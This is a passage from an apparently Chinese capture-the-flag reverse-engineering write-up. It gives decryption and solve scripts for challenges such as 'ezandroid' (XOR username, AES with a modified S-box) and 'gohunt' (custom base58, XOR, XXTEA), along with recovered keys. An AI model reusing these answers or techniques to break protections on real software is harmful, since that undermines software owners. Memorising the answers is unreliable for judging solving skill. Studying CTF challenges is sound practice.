class="hljs-keyword">def</span> <span class="hljs-title">enc</span>(<span class="hljs-params">a0, a1</span>):</span></span><br><span class="line">    tmp0 = a0+ek[<span class="hljs-number">0</span>]</span><br><span class="line">    tmp1 = a1+ek[<span class="hljs-number">1</span>]</span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">22</span>):</span><br><span class="line">        <span class="hljs-comment"># print(tmp0, tmp1)</span></span><br><span class="line">        t0 = tmp0 ^ tmp1</span><br><span class="line">        t1 = tmp1 &amp; <span class="hljs-number">31</span></span><br><span class="line">        t0 = ((t0 &lt;&lt; t1)) &amp; <span class="hljs-number">0xffffffff</span> | ((t0 &gt;&gt; (<span class="hljs-number">32</span>-t1)) &amp; <span class="hljs-number">0xffffffff</span>)</span><br><span class="line">        t0 += ek[<span class="hljs-number">2</span>*i]</span><br><span class="line">        tmp0 = t0 &amp; <span class="hljs-number">0xffffffff</span></span><br><span class="line">        t1 = tmp1 ^ tmp0</span><br><span class="line">        t0 &amp;= <span class="hljs-number">31</span></span><br><span class="line">        t1 = ((t1 &lt;&lt; t0)) &amp; <span class="hljs-number">0xffffffff</span> | ((t1 &gt;&gt; (<span class="hljs-number">32</span>-t0)) &amp; <span class="hljs-number">0xffffffff</span>)</span><br><span class="line">        t1 += ek[<span class="hljs-number">2</span>*i+<span class="hljs-number">1</span>]</span><br><span class="line">        tmp1 = t1 &amp; <span class="hljs-number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> tmp0, tmp1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dec</span>(<span class="hljs-params">a0, a1</span>):</span></span><br><span class="line">    tmp0 = a0</span><br><span class="line">    tmp1 = a1</span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):</span><br><span class="line">        t1 = (tmp1-ek[<span class="hljs-number">2</span>*i+<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xffffffff</span></span><br><span class="line">        t0 = tmp0 &amp; <span class="hljs-number">31</span></span><br><span class="line">        t1 = ((t1 &gt;&gt; t0)) &amp; <span class="hljs-number">0xffffffff</span> | ((t1 &lt;&lt; (<span class="hljs-number">32</span>-t0)) &amp; <span class="hljs-number">0xffffffff</span>)</span><br><span class="line">        tmp1 = t1 ^ tmp0</span><br><span class="line">        t0 = (tmp0-ek[<span class="hljs-number">2</span>*i]) &amp; <span class="hljs-number">0xffffffff</span></span><br><span class="line">        t1 = tmp1 &amp; <span class="hljs-number">31</span></span><br><span class="line">        t0 = ((t0 &gt;&gt; t1)) &amp; <span class="hljs-number">0xffffffff</span> | ((t0 &lt;&lt; (<span class="hljs-number">32</span>-t1)) &amp; <span class="hljs-number">0xffffffff</span>)</span><br><span class="line">        tmp0 = t0 ^ tmp1</span><br><span class="line">    tmp0 =(tmp0- ek[<span class="hljs-number">0</span>])&amp;<span class="hljs-number">0xffffffff</span></span><br><span class="line">    tmp1 =(tmp1- ek[<span class="hljs-number">1</span>])&amp;<span class="hljs-number">0xffffffff</span></span><br><span class="line">    <span class="hljs-keyword">return</span> tmp0, tmp1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># a0, a1 = enc(0x61626364, 0x61626364)</span></span><br><span class="line"><span class="hljs-comment"># print(hex(a0),hex(a1))</span></span><br><span class="line">r=[]</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(res),<span class="hljs-number">4</span>):</span><br><span class="line">    tmp=res[i:i+<span class="hljs-number">4</span>]</span><br><span class="line">    r.append(<span class="hljs-built_in">int</span>.from_bytes(tmp,byteorder=<span class="hljs-string">"big"</span>))</span><br><span class="line">f=[<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(r))]</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(r),<span class="hljs-number">2</span>):</span><br><span class="line">    f[i], f[i+<span class="hljs-number">1</span>] = dec(r[i], r[i+<span class="hljs-number">1</span>])</span><br><span class="line">    <span class="hljs-keyword">if</span> i!=<span class="hljs-number">0</span>:</span><br><span class="line">        f[i]^=r[i-<span class="hljs-number">2</span>]</span><br><span class="line">        f[i+<span class="hljs-number">1</span>]^=r[i-<span class="hljs-number">1</span>]</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f:</span><br><span class="line">    <span class="hljs-comment"># print(hex(i))</span></span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>.to_bytes(i,<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">"big"</span>).decode(),end=<span class="hljs-string">""</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="ezandroid"><a href="#ezandroid" class="headerlink" title="ezandroid"></a>ezandroid</h2><p>检查用户名密码，用户名直接异或，密码是换了sbox的AES</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">username = [<span class="hljs-number">0xE9</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x43</span>]</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(username)):</span><br><span class="line">    username[i] ^= i</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(username).<span class="hljs-built_in">hex</span>())</span><br><span class="line"><span class="hljs-comment"># rc4</span></span><br><span class="line"><span class="hljs-comment"># Re_1s_eaSy</span></span><br><span class="line"></span><br><span class="line">sbox = [<span class="hljs-number">0x29</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x7B</span>,</span><br><span class="line">        <span class="hljs-number">0x92</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x12</span>]</span><br><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(sbox))  <span class="hljs-comment"># 正向S-box</span></span><br><span class="line">inv_sbox = [<span class="hljs-number">0</span>] * <span class="hljs-number">256</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> index, value <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(sbox):</span><br><span class="line">    inv_sbox[value] = index</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">print</span>(inv_sbox)</span><br></pre></td></tr></tbody></table></figure><p>把生成的表替换进去</p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"aes.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">uint8_t</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">uint8_t</span> key[] = <span class="hljs-string">"Re_1s_eaSy123456"</span>;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">uint8_t</span> *w; <span class="hljs-comment">// expanded key</span></span><br><span class="line"></span><br><span class="line">  w = aes_init(<span class="hljs-keyword">sizeof</span>(key));</span><br><span class="line"></span><br><span class="line">  aes_key_expansion(key, w);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> out[<span class="hljs-number">16</span>] = {<span class="hljs-number">0x2B</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x9B</span>,</span><br><span class="line">                           <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x50</span>};</span><br><span class="line">  aes_inv_cipher(out, in, w);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s\n"</span>, in);</span><br><span class="line">  <span class="hljs-built_in">free</span>(w);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="gohunt"><a href="#gohunt" class="headerlink" title="gohunt"></a>gohunt</h2><p>换表base58，异或和xxtea</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">base64_table = [<span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base64_reverse_table = [<span class="hljs-number">0</span>] * <span class="hljs-number">256</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> index, value <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(base64_table):</span><br><span class="line">    <span class="hljs-keyword">if</span> value <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:</span><br><span class="line">        base64_reverse_table[value] = index</span><br><span class="line"></span><br><span class="line">table=<span 